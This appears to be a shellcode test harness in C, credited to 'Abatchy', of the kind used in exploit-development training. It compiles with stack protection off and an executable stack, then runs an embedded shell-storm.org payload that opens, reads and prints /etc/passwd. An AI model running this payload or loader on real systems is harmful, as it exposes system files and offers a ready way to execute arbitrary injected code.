/*
 ShellcodeSkeleton.c
By Abatchy
gcc ShellcodeSkeleton.c -fno-stack-protector -z execstack -o ShellcodeSkeleton.out
*/

#include <stdio.h>
#include <string.h>

// Example shellcode from http://shell-storm.org/shellcode/files/shellcode-842.php
unsigned char shellcode[] = 
"\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73"
"\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f"
"\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03"
"\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92"
"\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd"
"\x80";

int main()
{
    printf("Shellcode size: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
